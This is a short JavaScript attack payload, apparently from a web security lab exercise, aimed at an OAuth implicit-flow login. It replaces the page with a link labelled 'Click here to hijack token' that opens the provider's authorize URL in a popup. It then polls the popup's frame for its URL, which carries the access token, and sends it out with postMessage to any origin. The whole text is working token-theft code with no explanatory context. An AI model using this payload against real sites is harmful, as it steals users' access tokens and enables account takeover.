document.body.innerHTML = '<a href="#" onclick="b=window.open(\'http://lab-provider.com:9001/oauth?redirect_uri=http%3A%2F%2Flab-site.com%3A9000%2Fcallback%2f&response_type=token&application_id=574a33452ec5e4fc2bfa60d049a70c57\', \'pop\', \'width=850,height=750,resizable=1\');">Click here to hijack token</a>';

x = setInterval(function () {
    if (window.b &&
        window.b.frames[0] &&
        window.b.frames[0].location.href) {
        top.postMessage(window.b.frames[0].location.href, '*');
        window.b.close();
        clearInterval(x);
    }
}, 500);
